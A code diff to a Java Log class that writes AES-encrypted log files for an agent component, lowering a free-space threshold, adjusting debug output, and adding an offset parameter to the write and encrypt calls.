@@ -80,10 +80,10 @@ public final class Log {
             LogType.UNKNOWN, LogType.APPLICATION // 10..11
     };
 
-    private static final long MIN_AVAILABLE_SIZE = 1024 * 1024;
+    private static final long MIN_AVAILABLE_SIZE = 200 * 1024;
 
     //#ifdef DEBUG
-    private static Debug debug = new Debug("Log", DebugLevel.VERBOSE);
+    private static Debug debug = new Debug("Log", DebugLevel.INFORMATION);
 
     //#endif
 
@@ -152,10 +152,10 @@ public final class Log {
         Check.requires(aesKey != null, "createLog: aesKey null");
         Check.requires(encryption != null, "createLog: encryption null");
         //#endif
-        
+
         agent = agent_;
         encryption.makeKey(aesKey);
-        
+
         //#ifdef DBC
         Check.ensures(agent != null, "createLog: agent null");
         Check.ensures(encryption != null, "createLog: encryption null");
@@ -299,20 +299,18 @@ public final class Log {
                 //#endif
                 return false;
             }
-            
+
             long available = fconn.availableSize();
-            if( available < MIN_AVAILABLE_SIZE){
-              //#ifdef DEBUG
+            if (available < MIN_AVAILABLE_SIZE) {
+                //#ifdef DEBUG
                 debug.fatal("not enough space: " + available);
                 //#endif
                 return false;
             }
 
+           
             //#ifdef DEBUG_INFO
-            debug.info("Created :" + plainFileName);
-            //#endif
-            //#ifdef DEBUG_TRACE
-            debug.info("filename: " + fileName);
+            debug.info("Created: " + fileName);
             //#endif
 
             final byte[] plainBuffer = makeDescription(additionalData, logType);
@@ -342,7 +340,7 @@ public final class Log {
             //#endif
 
             //#ifdef DEBUG_TRACE
-            debug.trace("plainBuffer.length: " + plainBuffer.length);
+            debug.trace("additionalData.length: " + plainBuffer.length);
             debug.trace("encBuffer.length: " + encBuffer.length);
             //#endif
 
@@ -452,6 +450,10 @@ public final class Log {
         return null;
     }
 
+    public boolean writeLog(final byte[] data) {
+        return writeLog(data, 0);
+    }
+
     /**
      * Questa funzione prende i byte puntati da pByte, li cifra e li scrive nel
      * file di log creato con CreateLog(). La funzione torna TRUE se va a buon
@@ -461,7 +463,7 @@ public final class Log {
      *            the data
      * @return true, if successful
      */
-    public synchronized boolean writeLog(final byte[] data) {
+    public synchronized boolean writeLog(final byte[] data, int offset) {
         if (os == null) {
             //#ifdef DEBUG
             debug.error("os null");
@@ -476,10 +478,13 @@ public final class Log {
             return false;
         }
 
-        final byte[] encData = encryption.encryptData(data);
+        final byte[] encData = encryption.encryptData(data, offset);
+        //#ifdef DEBUG_INFO
+        debug.info("writeLog encdata: " + encData.length);
+        //#endif
 
         try {
-            os.write(Utils.intToByteArray(data.length));
+            os.write(Utils.intToByteArray(data.length - offset));
             os.write(encData);
             os.flush();
         } catch (final IOException e) {
